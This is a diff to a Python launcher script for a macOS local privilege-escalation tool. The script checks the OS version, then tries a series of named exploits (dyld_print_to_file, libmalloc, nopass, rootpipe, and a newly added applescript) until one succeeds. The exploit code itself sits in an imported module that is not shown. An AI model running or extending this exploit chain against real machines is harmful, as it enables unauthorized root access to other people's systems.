@@ -1,7 +1,6 @@
 #!/usr/bin/env python
-# import plistlib
 import platform
-import os
+from distutils.version import LooseVersion
 
 from exploits import *
 
@@ -13,18 +12,22 @@ ENDC = "\033[00m"
 
 def main():
     version = platform.mac_ver()[0]
-    for exploit in [dyld_print_to_file, libmalloc, nopass, rootpipe]:
-        if not exploit.vulnerable(version):
+    for exploit in [dyld_print_to_file, libmalloc, nopass, rootpipe, applescript]:
+        if not exploit.vulnerable(LooseVersion(version)):
             print(YELLOWC + "Skipping %s...\n" % exploit.__name__ + ENDC)
             continue
-        print(YELLOWC + "Trying %s..." % exploit.__name__ + ENDC)
+        print(YELLOWC + "Trying %s...\n" % exploit.__name__ + ENDC)
         result = exploit.run()
         if result:
-            print(GREENC + "Successful" + ENDC)
-            return
+            print(GREENC + exploit.__name__ + " was successful!" + ENDC)
+            return result
         print(REDC + "Failed\n" + ENDC)
-    print(REDC + "All Exploits Already Patched..." + ENDC)
+    print(REDC + "All Exploits Failed..." + ENDC)
 
 
 if __name__ == '__main__':
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("Exitting...")
+        exit(0)
